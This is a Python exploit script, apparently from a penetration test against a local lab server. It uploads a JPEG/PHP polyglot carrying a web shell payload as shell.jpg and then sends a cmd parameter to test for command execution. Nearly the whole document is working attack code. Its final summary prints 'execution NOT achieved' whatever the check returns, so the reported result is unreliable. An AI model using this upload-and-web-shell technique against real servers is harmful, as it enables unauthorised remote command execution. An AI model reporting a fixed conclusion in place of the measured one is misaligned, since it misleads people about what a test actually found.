import requests
import re

base_url = "http://127.0.0.1:32824"
print("Final validation: Confirming no PHP execution achieved")
print("=" * 60)

# Re-verify the key findings
print("\n[1] Uploading standard polyglot...")
polyglot_content = (
    b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x48\x48\x00\x01\x00\x01\x00\x00"
    b"<?php system($_GET['cmd']); ?>"
    b"\xff\xd9"
)

files = {'userfile': ('shell.jpg', polyglot_content, 'image/jpeg')}
data = {'submit': 'Upload Image'}

upload_resp = requests.post(f"{base_url}/index.php", files=files, data=data, timeout=10)
print(f"Upload Status: {upload_resp.status_code}")

if "successfully uploaded" in upload_resp.text:
    match = re.search(r"href='([^']+)'", upload_resp.text)
    if match:
        upload_path = match.group(1)
        file_url = f"{base_url}/{upload_path}"
        
        print(f"\n[2] File uploaded to: {upload_path}")
        
        # Test direct access
        print("\n[3] Testing direct access:")
        access_resp = requests.get(file_url, timeout=10)
        print(f"Status: {access_resp.status_code}")
        print(f"Content-Type: {access_resp.headers.get('content-type', 'unknown')}")
        print(f"Size: {len(access_resp.content)}")
        print(f"Content preview: {access_resp.text[:100]}")
        
        # Test with parameter
        print("\n[4] Testing with cmd parameter:")
        exec_resp = requests.get(f"{file_url}?cmd=ls", timeout=10)
        print(f"Status: {exec_resp.status_code}")
        print(f"Content-Type: {exec_resp.headers.get('content-type', 'unknown')}")
        print(f"Size: {len(exec_resp.content)}")
        print(f"Content preview: {exec_resp.text[:100]}")
        
        # Summary
        if access_resp.text == exec_resp.text:
            print("\n[✓] CONFIRMED: File served as static content, no PHP execution")
            php_executed = False
        else:
            print("\n[?] Response changed with parameter")
            php_executed = True

print("\n" + "=" * 60)
print("RESULT: Polyglot upload successful but PHP execution NOT achieved")
print("The server serves uploaded files as static images with proper headers")
print("No access method tested resulted in PHP code execution")
